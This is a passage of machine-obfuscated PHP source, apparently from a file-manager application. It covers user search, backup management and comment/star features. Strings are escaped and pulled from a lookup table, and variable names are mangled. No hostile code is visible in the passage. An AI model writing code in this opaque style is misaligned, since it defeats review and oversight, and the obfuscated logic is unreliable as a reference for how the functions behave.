"\x75\163\145\x72\x2e{$Èí“ìó’}\x20{$ËÛèµî®}\54\x20\165\163\x65\x72\x2e\165\163\145\162\x49\x44\40\x61\163\x63"; return $this->alias($à½§ŒÒÓ[2176])->order($»ù˜í…”); } public function listSearch($€è“¢´) { $ó§©™óÌ =& $_SERVER[Õò”†—·]; $Ç¢å¢ÅÌ = trim($€è“¢´[$ó§©™óÌ[2052]]); $¶åøğÒ = explode($ó§©™óÌ[63], $Ç¢å¢ÅÌ); if (!$Ç¢å¢ÅÌ || count($¶åøğÒ) == 1) { return $this->listSearchNow($€è“¢´); } $ˆæ‚ŒÎ¢ = array($ó§©™óÌ[429] => array()); foreach ($¶åøğÒ as $§Ğğ€Öƒ) { if (!trim($§Ğğ€Öƒ)) { continue; } $€è“¢´[$ó§©™óÌ[2052]] = $§Ğğ€Öƒ; $’¸£âÙœ = $this->listSearchNow($€è“¢´); $ˆæ‚ŒÎ¢[$ó§©™óÌ[429]] = array_merge($ˆæ‚ŒÎ¢[$ó§©™óÌ[429]], $’¸£âÙœ[$ó§©™óÌ[429]]); } $ˆæ‚ŒÎ¢[$ó§©™óÌ[429]] = array_unique_by_key($ˆæ‚ŒÎ¢[$ó§©™óÌ[429]], $ó§©™óÌ[1755]); $ˆæ‚ŒÎ¢[$ó§©™óÌ[426]] = array($ó§©™óÌ[427] => count($ˆæ‚ŒÎ¢[$ó§©™óÌ[429]]), $ó§©™óÌ[423] => 20, $ó§©™óÌ[413] => 1, $ó§©™óÌ[428] => 1); return $ˆæ‚ŒÎ¢; } public function listSearchNow($ØØ£——) { $è‘»ÍíÎ =& $_SERVER[Õò”†—·]; $Õú½Éé­ = trim($ØØ£——[$è‘»ÍíÎ[2052]]); $‡ğ á¼Û = isset($ØØ£——[$è‘»ÍíÎ[2053]]) ? $ØØ£——[$è‘»ÍíÎ[2053]] : !1; $Õú½Éé­ = str_replace($è‘»ÍíÎ[2054], $è‘»ÍíÎ[2055], trim($Õú½Éé­)); $ßòå¶í¾ = array($è‘»ÍíÎ[42] => array($è‘»ÍíÎ[443], "\x25{$Õú½Éé­}\x25"), $è‘»ÍíÎ[365] => array($è‘»ÍíÎ[443], "{$Õú½Éé­}\x25"), $è‘»ÍíÎ[2242] => array($è‘»ÍíÎ[443], "{$Õú½Éé­}\45"), $è‘»ÍíÎ[1050] => $è‘»ÍíÎ[2056]); if (Input::check($Õú½Éé­, $è‘»ÍíÎ[371])) { $ßòå¶í¾[$è‘»ÍíÎ[1755]] = array($è‘»ÍíÎ[443], "{$Õú½Éé­}\x25"); $ßòå¶í¾[$è‘»ÍíÎ[2454]] = array($è‘»ÍíÎ[443], "{$Õú½Éé­}\45"); } if (!$Õú½Éé­) { $ßòå¶í¾ = array(); } if (isset($ØØ£——[$è‘»ÍíÎ[801]])) { $ßòå¶í¾[$è‘»ÍíÎ[801]] = $ØØ£——[$è‘»ÍíÎ[801]]; } $ßòå¶í¾ = $this->parseWhereLike($ßòå¶í¾); $ü‹Ú™™» = $this->_makeOrder()->where($ßòå¶í¾)->selectPage(20); if (!$ü‹Ú™™» || count($ü‹Ú™™»[$è‘»ÍíÎ[429]]) < 5 && Input::check($Õú½Éé­, $è‘»ÍíÎ[378])) { $‚É™ëì = $this->_searchFromMeta($è‘»ÍíÎ[521], $Õú½Éé­, 10); $‡¥ü™Àì = $this->_searchFromMeta($è‘»ÍíÎ[522], $Õú½Éé­, 10); $ú’ëÈë = array_merge($‚É™ëì, $‡¥ü™Àì, $ü‹Ú™™»[$è‘»ÍíÎ[429]]); $ü‹Ú™™»[$è‘»ÍíÎ[429]] = array_unique_by_key($ú’ëÈë, $è‘»ÍíÎ[1755]); $ü‹Ú™™»[$è‘»ÍíÎ[426]][$è‘»ÍíÎ[427]] = count($ü‹Ú™™»[$è‘»ÍíÎ[429]]); $ü‹Ú™™»[$è‘»ÍíÎ[426]][$è‘»ÍíÎ[428]] = ceil($ü‹Ú™™»[$è‘»ÍíÎ[426]][$è‘»ÍíÎ[427]] / $ü‹Ú™™»[$è‘»ÍíÎ[426]][$è‘»ÍíÎ[423]]); } $this->_listDataApply($ü‹Ú™™»[$è‘»ÍíÎ[429]]); $this->_filterByGroup($ü‹Ú™™», $‡ğ á¼Û); return $ü‹Ú™™»; } private function _filterByGroup(&$ÃíÒ¯¹, $šçÔ€ÛÎ) { $êï–áñ… =& $_SERVER[Õò”†—·]; if (!$šçÔ€ÛÎ) { return $ÃíÒ¯¹; } foreach ($ÃíÒ¯¹[$êï–áñ…[429]] as $ÍçùÇ•£ => &$Õ€™£›º) { $ª’Ã¶†— = array_to_keyvalue($Õ€™£›º[$êï–áñ…[2145]], $êï–áñ…[22], $êï–áñ…[1953]); if (!in_array($šçÔ€ÛÎ, $ª’Ã¶†—)) { unset($ÃíÒ¯¹[$êï–áñ…[429]][$ÍçùÇ•£]); } } unset($Õ€™£›º); $ÃíÒ¯¹[$êï–áñ…[429]] = array_values($ÃíÒ¯¹[$êï–áñ…[429]]); $ÃíÒ¯¹[$êï–áñ…[426]] = array($êï–áñ…[2212] => count($ÃíÒ¯¹[$êï–áñ…[429]]), $êï–áñ…[2210] => $ÃíÒ¯¹[$êï–áñ…[426]][$êï–áñ…[423]], $êï–áñ…[2209] => 1, $êï–áñ…[2211] => 1); } private function _searchFromMeta($ˆ¦şÖ…¼, $åü©‰ĞÍ, $”ï„‘§) { $÷Ëó¾Øõ =& $_SERVER[Õò”†—·]; $åü©‰ĞÍ = strtolower($åü©‰ĞÍ); $ĞåöıÉì = array($÷Ëó¾Øõ[107] => $ˆ¦şÖ…¼, $÷Ëó¾Øõ[434] => array($÷Ëó¾Øõ[443], "\45{$åü©‰ĞÍ}\x25")); $ĞåöıÉì = $this->parseWhereLike($ĞåöıÉì); $Ñ‹Ìâœ¨ = Model($÷Ëó¾Øõ[2473])->where($ĞåöıÉì)->limit($”ï„‘§)->select(); if (!$Ñ‹Ìâœ¨) { return array(); } $Ñ‹Ìâœ¨ = array_to_keyvalue($Ñ‹Ìâœ¨, $÷Ëó¾Øõ[22], $÷Ëó¾Øõ[1755]); $€ğ¥½êä = $this->where(array($÷Ëó¾Øõ[1746] => array($÷Ëó¾Øõ[17], $Ñ‹Ìâœ¨)))->select(); if (!$€ğ¥½êä) { return array(); } return $€ğ¥½êä; } private function _listDataApplyItem($­Ê˜°¸) { $¿õïëªò = array($­Ê˜°¸); $this->_listDataApply($¿õïëªò); return $¿õïëªò[0]; } private function _listDataApply(&$óÅ›–º) { $Æ‚ØÊ½ =& $_SERVER[Õò”†—·]; if (!$óÅ›–º) { return; } array_remove_key($óÅ›–º, $Æ‚ØÊ½[939]); $÷ŒŸ¢ÓÃ = array_to_keyvalue($óÅ›–º, $Æ‚ØÊ½[22], $Æ‚ØÊ½[1755]); $this->_listAppendGroup($óÅ›–º, $÷ŒŸ¢ÓÃ); $this->_listAppendMeta($óÅ›–º, $÷ŒŸ¢ÓÃ); $this->_listAppendSourceRoot($óÅ›–º, $÷ŒŸ¢ÓÃ); } private function _listAppendSourceRoot(&$ıŞÖöÉï, $‡Ô¬Å) { $·¬¨À£¬ =& $_SERVER[Õò”†—·]; $åòµ»Å£ = Model($·¬¨À£¬[875])->listSourceRoot(SourceModel::TYPE_USER, $‡Ô¬Å); $åòµ»Å£ = array_to_keyvalue($åòµ»Å£, $·¬¨À£¬[554]); $åòµ»Å£ = array_remove_key($åòµ»Å£, $·¬¨À£¬[554]); foreach ($ıŞÖöÉï as &$øĞçø©) { $øĞçø©[$·¬¨À£¬[100]] = $åòµ»Å£[$øĞçø©[$·¬¨À£¬[1755]]] ? $åòµ»Å£[$øĞçø©[$·¬¨À£¬[1755]]] : array(); } unset($øĞçø©); } private function _listAppendGroup(&$éø´ÇğŒ, $ãÃ¡‹èÉ) { $ˆŒ¿«˜Â =& $_SERVER[Õò”†—·]; $·’£ü˜‘ = array($ˆŒ¿«˜Â[1755] => array($ˆŒ¿«˜Â[17], $ãÃ¡‹èÉ)); $¬»å» Ï = Model($ˆŒ¿«˜Â[2048])->where($·’£ü˜‘)->select(); $ëûµµûñ = array_to_keyvalue($¬»å» Ï, $ˆŒ¿«˜Â[22], $ˆŒ¿«˜Â[1953]); $ëûµµûñ = array_remove_value(array_unique($ëûµµûñ), $ˆŒ¿«˜Â[229]); if (!$ëûµµûñ || !$¬»å» Ï) { return; } $·’£ü˜‘ = array($ˆŒ¿«˜Â[1953] => array($ˆŒ¿«˜Â[17], $ëûµµûñ)); $ß•ÌãÑŠ = Model($ˆŒ¿«˜Â[2143])->field($ˆŒ¿«˜Â[2474])->where($·’£ü˜‘)->select(); $ß•ÌãÑŠ = array_to_keyvalue($ß•ÌãÑŠ, $ˆŒ¿«˜Â[1953]); $¬»å» Ï = array_to_keyvalue_group($¬»å» Ï, $ˆŒ¿«˜Â[1755]); foreach ($¬»å» Ï as &$¶Ë”‡çÓ) { $âÎ‚¾ÒŸ = array(); foreach ($¶Ë”‡çÓ as $åÒşÃêÜ) { if (!$åÒşÃêÜ[$ˆŒ¿«˜Â[2062]]) { continue; } $«ğËê‰Ì = Model($ˆŒ¿«˜Â[556])->listData($åÒşÃêÜ[$ˆŒ¿«˜Â[2062]]); $âÎ‚¾ÒŸ[] = array($ˆŒ¿«˜Â[1953] => $åÒşÃêÜ[$ˆŒ¿«˜Â[1953]], $ˆŒ¿«˜Â[2475] => $ß•ÌãÑŠ[$åÒşÃêÜ[$ˆŒ¿«˜Â[1953]]][$ˆŒ¿«˜Â[42]], $ˆŒ¿«˜Â[569] => $ß•ÌãÑŠ[$åÒşÃêÜ[$ˆŒ¿«˜Â[1953]]][$ˆŒ¿«˜Â[569]], $ˆŒ¿«˜Â[471] => $«ğËê‰Ì); } $¶Ë”‡çÓ = $âÎ‚¾ÒŸ; } unset($¶Ë”‡çÓ); foreach ($éø´ÇğŒ as &$Œ¿ƒõ¤) { $Œ¿ƒõ¤[$ˆŒ¿«˜Â[2145]] = array(); if (isset($¬»å» Ï[$Œ¿ƒõ¤[$ˆŒ¿«˜Â[1755]]])) { $Œ¿ƒõ¤[$ˆŒ¿«˜Â[2145]] = $¬»å» Ï[$Œ¿ƒõ¤[$ˆŒ¿«˜Â[1755]]]; } } unset($Œ¿ƒõ¤); } public function userAppendGroup($ÅÈ‹ğÍç) { $‹‰Ñ¼³ =& $_SERVER[Õò”†—·]; if (!$ÅÈ‹ğÍç) { return array(); } $this->_listAppendGroup($ÅÈ‹ğÍç, array_to_keyvalue($ÅÈ‹ğÍç, $‹‰Ñ¼³[22], $‹‰Ñ¼³[1755])); return $ÅÈ‹ğÍç; } private function _listAppendMeta(&$‹ó»Õ–, $»ş‚Ù¡º) { $ÜÀÆìŞ„ =& $_SERVER[Õò”†—·]; $èÙÆşï¤ = UserJobModel::JOB_KEY; $¡±—Óí› = array($ÜÀÆìŞ„[2455]); $¸× ¾˜Ö = array($ÜÀÆìŞ„[1755] => array($ÜÀÆìŞ„[17], $»ş‚Ù¡º)); $Ìğ‡×ü = Model($ÜÀÆìŞ„[2453])->where($¸× ¾˜Ö)->select(); $Ìğ‡×ü = array_to_keyvalue_group($Ìğ‡×ü, $ÜÀÆìŞ„[1755]); foreach ($Ìğ‡×ü as &$ôâˆ¢ä) { $Şã¼›½½ = array(); foreach ($ôâˆ¢ä as $¨Ÿ©€­) { if (!in_array($¨Ÿ©€­[$ÜÀÆìŞ„[107]], $¡±—Óí›)) { $Şã¼›½½[$¨Ÿ©€­[$ÜÀÆìŞ„[107]]] = $¨Ÿ©€­[$ÜÀÆìŞ„[434]]; } } $ôâˆ¢ä = $Şã¼›½½; } unset($ôâˆ¢ä); $‹ÑË»ş² = Model($ÜÀÆìŞ„[2476]); foreach ($‹ó»Õ– as &$ÂÄâÒ‹Ô) { $Ç¨êÖˆÀ = array(); if (isset($Ìğ‡×ü[$ÂÄâÒ‹Ô[$ÜÀÆìŞ„[1755]]])) { $Ç¨êÖˆÀ = $Ìğ‡×ü[$ÂÄâÒ‹Ô[$ÜÀÆìŞ„[1755]]]; } $ÂÄâÒ‹Ô[$ÜÀÆìŞ„[2477]] = array(); if (isset($Ç¨êÖˆÀ[$èÙÆşï¤])) { $ÂÄâÒ‹Ô[$ÜÀÆìŞ„[2477]] = $‹ÑË»ş²->getUserJobInfo($Ç¨êÖˆÀ[$èÙÆşï¤]); } } unset($ÂÄâÒ‹Ô); } protected function groupUserAll($½¡ÊçÌª) { $”á›· =& $_SERVER[Õò”†—·]; if (!$½¡ÊçÌª) { return !1; } $šÉµØÓÕ = Model($”á›·[2048])->field($”á›·[1755])->where(array($”á›·[1953] => array($”á›·[17], $½¡ÊçÌª)))->select(); $šÉµØÓÕ = array_to_keyvalue($šÉµØÓÕ, $”á›·[22], $”á›·[1755]); return array_unique($šÉµØÓÕ); } public function userSearch($ÖØú´¥, $µà™ßîâ = "\52") { return Model($_SERVER[Õò”†—·][583])->where($ÖØú´¥)->field($µà™ßîâ)->find(); } } goto FÂ²•ãßë·; c£„È•¤èø: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\x62\141\143\153\165\160\x4c\151\163\164"; public $field = array("\151\157", "\x6e\141\x6d\145", "\163\164\141\x74\165\x73", "\x63\157\156\x74\145\156\x74", "\x6d\x61\x6e\165\141\x6c", "\162\x65\x73\x75\154\164", "\x74\x69\x6d\x65\106\x72\x6f\x6d", "\x74\x69\155\x65\124\157"); public function config() { $ë’›í–Ú =& $_SERVER[Õò”†—·]; $üÁ²ïà = Model($ë’›í–Ú[821])->get($ë’›í–Ú[833]); $üÁ²ïà = json_decode($üÁ²ïà, !0); $üÁ²ïà = is_array($üÁ²ïà) ? $üÁ²ïà : array(); if (!isset($üÁ²ïà[$ë’›í–Ú[805]])) { $üÁ²ïà[$ë’›í–Ú[805]] = $ë’›í–Ú[101]; } unset($üÁ²ïà[$ë’›í–Ú[1725]]); Action($ë’›í–Ú[1978])->taskInit(); Model($ë’›í–Ú[1724])->cacheClear(); $‰áÈ§ÏÛ = $ë’›í–Ú[1979]; $·¼„–¦ö = Model($ë’›í–Ú[1980])->findByKey($ë’›í–Ú[1743], $‰áÈ§ÏÛ); if (!$·¼„–¦ö) { $·¼„–¦ö = array(); } if (isset($·¼„–¦ö[$ë’›í–Ú[207]])) { $·¼„–¦ö[$ë’›í–Ú[207]] = json_decode($·¼„–¦ö[$ë’›í–Ú[207]], !0); } if (isset($üÁ²ïà[$ë’›í–Ú[207]])) { $·¼„–¦ö[$ë’›í–Ú[207]][$ë’›í–Ú[1728]] = $üÁ²ïà[$ë’›í–Ú[207]]; unset($üÁ²ïà[$ë’›í–Ú[207]]); } return array_merge($·¼„–¦ö, $üÁ²ïà); } public function listData($Š³Ï¬Ë = false, $î¸ÒÁ¾Â = "\x6d\157\144\x69\x66\171\124\151\155\x65", $Š¥•©¢ = false) { return parent::listData($Š³Ï¬Ë, $î¸ÒÁ¾Â, !0); } public function lastItem() { $ûÃø‡¢ì = $this->listData(); return !empty($ûÃø‡¢ì[0]) ? $ûÃø‡¢ì[0] : null; } public function kill($™É–µ±) { $»“êµ•† =& $_SERVER[Õò”†—·]; $÷û…«¥¹ = $this->listData($™É–µ±); if (!$÷û…«¥¹ || empty($÷û…«¥¹[$»“êµ•†[42]])) { return !0; } Task::kill($»“êµ•†[832]); Task::kill($»“êµ•†[850]); Task::kill($»“êµ•†[859]); $¨˜‹Æ×– = $÷û…«¥¹[$»“êµ•†[42]]; $£ÛØçÄê = TEMP_FILES . $»“êµ•†[829] . $¨˜‹Æ×– . $»“êµ•†[18]; IO::remove($£ÛØçÄê, !1); return $this->remove($™É–µ±); } public function remove($òÖô»˜Õ) { $ë•—˜ª» = $this->listData($òÖô»˜Õ); if (!$ë•—˜ª») { return !0; } return $this->backupRemove($ë•—˜ª»); } private function backupRemove($Ê„˜Áø) { parent::remove($Ê„˜Áø[$_SERVER[Õò”†—·][459]]); $Û‡¼‡í = $this->backupPath($Ê„˜Áø); IO::remove($Û‡¼‡í, !1); return !0; } private function backupPath($«‰¡ÌÂ) { $Ï³‡¸çğ =& $_SERVER[Õò”†—·]; $Ë“Ïã§° = $«‰¡ÌÂ[$Ï³‡¸çğ[42]]; $íÆáï·  = Model($Ï³‡¸çğ[821])->get($Ï³‡¸çğ[822]); $Ü¯õˆÙú = substr(md5($Ï³‡¸çğ[823] . $íÆáï·  . $Ë“Ïã§°), 0, 8); return "\173\151\x6f\x3a{$«‰¡ÌÂ[$Ï³‡¸çğ[802]]}\x7d\x2f\x64\141\164\141\x62\141\x73\x65\57\142\x61\143\x6b\x75\160\x2f" . $Ë“Ïã§° . $Ï³‡¸çğ[21] . $Ü¯õˆÙú; } public function start() { $¿˜í©¿‘ =& $_SERVER[Õò”†—·]; if ($GLOBALS[$¿˜í©¿‘[16]][$¿˜í©¿‘[102]][$¿˜í©¿‘[1981]] != $¿˜í©¿‘[101]) { return !0; } $Õ­¹²ƒ = $this->config(); if (!$Õ­¹²ƒ || $Õ­¹²ƒ[$¿˜í©¿‘[1725]] != $¿˜í©¿‘[101]) { return !1; } $’ó¸Š¿ = $this->process(); foreach ($’ó¸Š¿ as $îçÀãÚÜ) { if ($îçÀãÚÜ) { return Task::restart($îçÀãÚÜ[$¿˜í©¿‘[459]]); } } $¢Ç¡®œ = new Backup(); $œŞá¡ó = $¢Ç¡®œ->db(); if ($œŞá¡ó) { $œŞá¡ó = $¢Ç¡®œ->dbFile(); if ($œŞá¡ó && $Õ­¹²ƒ[$¿˜í©¿‘[805]] == $¿˜í©¿‘[229]) { $œŞá¡ó = $¢Ç¡®œ->file(); } } Backup::set(array($¿˜í©¿‘[801] => 1, $¿˜í©¿‘[812] => time())); return !0; } public function process() { $óš¸òÌ =& $_SERVER[Õò”†—·]; $ÙŞšş¢ë = array($óš¸òÌ[808] => Task::get($óš¸òÌ[832]), $óš¸òÌ[813] => Task::get($óš¸òÌ[850]), $óš¸òÌ[231] => Task::get($óš¸òÌ[859])); $Ò¤Ã’™ˆ = !1; foreach ($ÙŞšş¢ë as &$×ŞáÇõí) { if ($Ò¤Ã’™ˆ) { $×ŞáÇõí = !1; continue; } if ($×ŞáÇõí) { $÷Šáî‰¡ = intval(_get($×ŞáÇõí, $óš¸òÌ[1760], 0)); if (time() - $÷Šáî‰¡ > 7200) { Task::kill($×ŞáÇõí[$óš¸òÌ[459]]); $Ò¤Ã’™ˆ = !0; $×ŞáÇõí = !1; } } } return $ÙŞšş¢ë; } public function restore() { $³ùüëíƒ =& $_SERVER[Õò”†—·]; ActionCall($³ùüëíƒ[1110], !0, 1); ActionCall($³ùüëíƒ[1110], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\164"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\x61\x6d\145" => "\x63\157\x6d\x6d\x65\x6e\x74\137\155\145\164\x61", "\155\145\164\141\x46\151\x65\x6c\x64" => "\x63\157\x6d\155\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($íÇÖ‡—) { $çÕü¹Ç =& $_SERVER[Õò”†—·]; if ($íÇÖ‡—[$çÕü¹Ç[1982]]) { $´é­ìÜ = $this->where(array($çÕü¹Ç[1983] => $íÇÖ‡—[$çÕü¹Ç[1982]]))->find(); if (!$´é­ìÜ || $´é­ìÜ[$çÕü¹Ç[191]] != $íÇÖ‡—[$çÕü¹Ç[191]] || $´é­ìÜ[$çÕü¹Ç[554]] != $íÇÖ‡—[$çÕü¹Ç[554]]) { return !1; } $this->where(array($çÕü¹Ç[1983] => $íÇÖ‡—[$çÕü¹Ç[1982]]))->setAdd($çÕü¹Ç[1984], 1); } $íÇÖ‡—[$çÕü¹Ç[1985]] = 0; $íÇÖ‡—[$çÕü¹Ç[1984]] = 0; $íÇÖ‡—[$çÕü¹Ç[801]] = 1; return $this->add($íÇÖ‡—); } public function commentCount($ƒúÈ¿Åù, $ÌÛìÀĞì, $ÍÙ“‡ = false) { $Ò±‡ìò– =& $_SERVER[Õò”†—·]; if (!$ƒúÈ¿Åù) { return array(); } if (is_string($ƒúÈ¿Åù) || is_int($ƒúÈ¿Åù)) { $ƒúÈ¿Åù = array($ƒúÈ¿Åù); } $³ÛâŠ§ = array($Ò±‡ìò–[554], $Ò±‡ìò–[1986] => $Ò±‡ìò–[550]); $ŠµÜ¡˜± = array($Ò±‡ìò–[554] => array($Ò±‡ìò–[17], $ƒúÈ¿Åù), $Ò±‡ìò–[191] => $ÌÛìÀĞì); if ($ÍÙ“‡) { $ŠµÜ¡˜±[$Ò±‡ìò–[1755]] = $ÍÙ“‡; } $©åÅ«î× = $this->field($³ÛâŠ§)->where($ŠµÜ¡˜±)->group($Ò±‡ìò–[554])->select(); return array_to_keyvalue($©åÅ«î×, $Ò±‡ìò–[554], $Ò±‡ìò–[550]); } public function starTarget($Ñ™—Òµ, $”®‰Ê®€) { $šºßÎèÑ =& $_SERVER[Õò”†—·]; $Ô‘ª†…¯ = $Ñ™—Òµ + self::TYPE_STAR_OFFSET; $äşÅÖ½½ = array($šºßÎèÑ[1755] => USER_ID, $šºßÎèÑ[191] => $Ô‘ª†…¯, $šºßÎèÑ[554] => $”®‰Ê®€); $ÇåÚ¢£Ñ = $this->where($äşÅÖ½½)->find(); if ($ÇåÚ¢£Ñ) { return $this->where(array($šºßÎèÑ[459] => $ÇåÚ¢£Ñ[$šºßÎèÑ[459]]))->delete(); } $ò¼Í²ˆœ = array($šºßÎèÑ[1982] => 0, $šºßÎèÑ[1755] => USER_ID, $šºßÎèÑ[801] => 1, $šºßÎèÑ[805] => $šºßÎèÑ[22], $šºßÎèÑ[191] => $Ô‘ª†…¯, $šºßÎèÑ[554] => $”®‰Ê®€, $šºßÎèÑ[1985] => 0, $šºßÎèÑ[1984] => 0); return $this->add($ò¼Í²ˆœ); } public function starTargetCount($ºÉŠüşö, $Ú ¥ŸÙ) { $õÀ¹•éª =& $_SERVER[Õò”†—·]; $ŠãõûÈ = $Ú ¥ŸÙ + self::TYPE_STAR_OFFSET; $è†µºû› = $this->commentCount($ºÉŠüşö, $ŠãõûÈ); $ßÜÆûîÑ = $this->commentCount($ºÉŠüşö, $ŠãõûÈ, USER_ID); return array($õÀ¹•éª[1987] => $è†µºû›, $õÀ¹•éª[1988] => $ßÜÆûîÑ); } public function starTargetUserList($´ğõƒÍ, $Ş‹¡¤„É) { $óÎõ„ŒÆ =& $_SERVER[Õò”†—·]; $Ñ¸ïÃÎ­ = $´ğõƒÍ + self::TYPE_STAR_OFFSET; $³øœ¨Æ¼ = array($óÎõ„ŒÆ[554] => $Ş‹¡¤„É, $óÎõ„ŒÆ[191] => $Ñ¸ïÃÎ­); $Ë–¨ˆÔ’ = $this->where($³øœ¨Æ¼)->count(); $¿Šõê¤Í = array($óÎõ„ŒÆ[316] => $Ë–¨ˆÔ’, $óÎõ„ŒÆ[1989] => array()); if (!$Ë–¨ˆÔ’) { return $¿Šõê¤Í; } $îò‡Ş±ş = $this->field($óÎõ„ŒÆ[1755])->where($³øœ¨Æ¼)->limit(500)->select(); $îò‡Ş±ş = array_to_keyvalue($îò‡Ş±ş, $óÎõ„ŒÆ[22], $óÎõ„ŒÆ[1755]); $¿Šõê¤Í[$óÎõ„ŒÆ[1989]] = Model($óÎõ„ŒÆ[562])->userListInfo($îò‡Ş±ş); return $¿Šõê¤Í; } public function prasiseUserList($”®‡œ¿ù) { $Å€ê¶· =& $_SERVER[Õò”†—·]; $úĞ§ƒ­Á = array($Å€ê¶·[1990] => $”®‡œ¿ù); $äÁ²şĞ = $this->where($úĞ§ƒ­Á)->find(); $üşÈ Ç© = _get($äÁ²şĞ, $Å€ê¶·[1985], 0); $â»³¾èÜ = array($Å€ê¶·[316] => $üşÈ Ç©, $Å€ê¶·[1989] => array()); if (!$üşÈ Ç©) { return $â»³¾èÜ; } $À¬×î© = Model($Å€ê¶·[1991])->field($Å€ê¶·[1755])->where($úĞ§ƒ­Á)->limit(500)->select(); $À¬×î© = array_to_keyvalue($À¬×î©, $Å€ê¶·[22], $Å€ê¶·[1755]); $â»³¾èÜ[$Å€ê¶·[1989]] = Model($Å€ê¶·[562])->userListInfo($À¬×î©); return $â»³¾èÜ; } public function remove($µÃ®øÆİ) { $æ‹Ì™â¨ =& $_SERVER[Õò”†—·]; $¾–¼‰ø£ = array($æ‹Ì™â¨[1983] => $µÃ®øÆİ); $™Á÷Ø©Å = $this->where($¾–¼‰ø£)->find(); if ($™Á÷Ø©Å[$æ‹Ì™â¨[1982]]) { $this->where(array($æ‹Ì™â¨[1983] => $™Á÷Ø©Å[$æ‹Ì™â¨[1982]]))->setAdd($æ‹Ì™â¨[1984], -1); } return $this->where($¾–¼‰ø£)->delete(); } public function edit($‰¿†Í…˜, $£ôÎÄÏİ) { $‡Æñù‡ =& $_SERVER[Õò”†—·]; $øâå»Šù = array($‡Æñù‡[1983] => $‰¿†Í…˜); return $this->where($øâå»Šù)->save(array($‡Æñù‡[1992] => $£ôÎÄÏİ)); } public function prasise($¢±ª†Ì) { $›Ô³‚ıõ =& $_SERVER[Õò”†—·]; $áğÜÜäø = Model($›Ô³‚ıõ[1993]); $×í“İ£‡ = array($›Ô³‚ıõ[1983] => $¢±ª†Ì, $›Ô³‚ıõ[1746] => USER_ID); $íÄÕÜ™Ê = $áğÜÜäø->where($×í“İ£‡)->find(); if (!$íÄÕÜ™Ê) { $áğÜÜäø->add($×í“İ£‡); $‰ñ¢•¹ = $this->where(array($›Ô³‚ıõ[1983] => $¢±ª†Ì))->setAdd($›Ô³‚ıõ[1985], 1); } else { $áğÜÜäø->where($×í“İ£‡)->delete(); $‰ñ¢•¹ = $this->where(array($›Ô³‚ıõ[1983] => $¢±ª†Ì))->setAdd($›Ô³‚ıõ[1985], -1); } return $‰ñ¢•¹; } public function targetInfo($»üµˆõİ, $à´åÑ¸š) { $·ãõàÖ =& $_SERVER[Õò”†—·]; $¸Ïš§Äã = array($·ãõàÖ[632] => $»üµˆõİ, $·ãõàÖ[633] => $à´åÑ¸š); $ê»¯´å‰ = $this->where($¸Ïš§Äã)->count(); $ªùâØò¸ = "\x52\x49\x47\110\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\143\x6f\x6d\155\x65\156\x74\137\160\x72\141\x69\x73\145\x20\163\164\x61\162\40\157\156\40\143\x6f\155\x6d\145\156\164\x2e\143\157\155\155\145\156\x74\111\104\x20\x3d\40\x73\x74\141\162\56\143\157\155\155\x65\156\164\x49\104"; $îøÉÏ‚‘ = $this->alias($·ãõàÖ[414])->where($¸Ïš§Äã)->join($ªùâØò¸, $·ãõàÖ[1994])->count(); $¢ùí¯ĞÜ = array($·ãõàÖ[1995] => $ê»¯´å‰, $·ãõàÖ[1996] => $îøÉÏ‚‘); return $¢ùí¯ĞÜ; } public function listData($¼ĞË‚«í) { $„ø—Å­€ =& $_SERVER[Õò”†—·]; if (isset($¼ĞË‚«í[$„ø—Å­€[1997]])) { if ($¼ĞË‚«í[$„ø—Å­€[1997]]) { $¼ĞË‚«í[$„ø—Å­€[1990]] = array($„ø—Å­€[1064], intval($¼ĞË‚«í[$„ø—Å­€[1997]])); } unset($¼ĞË‚«í[$„ø—Å­€[1997]]); } if (isset($¼ĞË‚«í[$„ø—Å­€[1998]])) { if ($¼ĞË‚«í[$„ø—Å­€[1998]]) { $¼ĞË‚«í[$„ø—Å­€[1990]] = array($„ø—Å­€[1061], intval($¼ĞË‚«í[$„ø—Å­€[1998]])); } unset($¼ĞË‚«í[$„ø—Å­€[1998]]); } return $this->_listData($¼ĞË‚«í); } private function _listData($æó°ªø•) { $Üé™˜À =& $_SERVER[Õò”†—·]; $ñÛş†ô = $this->where($æó°ªø•)->_makeOrder()->selectPage(100); $this->_listAppendParent($ñÛş†ô[$Üé™˜À[429]]); $this->_listAppendUser($ñÛş†ô[$Üé™˜À[429]]); $this->_listAppendMeta($ñÛş†ô[$Üé™˜À[429]]); return $ñÛş†ô; } private function _makeOrder() { $æÔÌŠƒÄ =& $_SERVER[Õò”†—·]; $ÙÔÒ˜¤ = array($æÔÌŠƒÄ[1985], $æÔÌŠƒÄ[1984], $æÔÌŠƒÄ[232]); $ô°æœËñ = Input::get($æÔÌŠƒÄ[514], $æÔÌŠƒÄ[17], $æÔÌŠƒÄ[481], $ÙÔÒ˜¤); $¨ğßÃÆ = Input::get($æÔÌŠƒÄ[515], $æÔÌŠƒÄ[17], $æÔÌŠƒÄ[1748], array($æÔÌŠƒÄ[1999], $æÔÌŠƒÄ[510])); $ŞÙ¤—ó = $ô°æœËñ . $æÔÌŠƒÄ[63] . $¨ğßÃÆ; return $this->order($ŞÙ¤—ó); } private function _listAppendParent(&$ì—’‘¸ï) { $ûº†ÜßË =& $_SERVER[Õò”†—·]; $Ê¦ØŠÈÏ = array_unique(array_to_keyvalue($ì—’‘¸ï, $ûº†ÜßË[22], $ûº†ÜßË[1982])); $Ê¦ØŠÈÏ = array_remove_value($Ê¦ØŠÈÏ, $ûº†ÜßË[229]); if (!$Ê¦ØŠÈÏ) { return; } $Ú³àîÆÌ = $this->where(array($ûº†ÜßË[1983] => array($ûº†ÜßË[17], $Ê¦ØŠÈÏ)))->select(); $Ú³àîÆÌ = array_to_keyvalue($Ú³àîÆÌ, $ûº†ÜßË[1990]); foreach ($ì—’‘¸ï as &$¸ù©¡ßÈ) { if (isset($Ú³àîÆÌ[$¸ù©¡ßÈ[$ûº†ÜßË[1982]]])) { 